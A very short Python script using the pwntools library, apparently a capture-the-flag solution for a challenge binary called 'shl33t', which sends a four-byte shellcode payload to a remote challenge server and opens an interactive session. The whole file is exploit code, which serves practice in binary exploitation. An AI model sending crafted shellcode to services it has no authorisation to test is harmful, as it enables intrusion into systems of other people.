from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = process('./shl33t')
p=remote("154.57.164.75",32030)

payload = b"\xC1\xE3\x10\xC3"  # shl ebx, 16 ; ret

p.send(payload)
p.interactive()
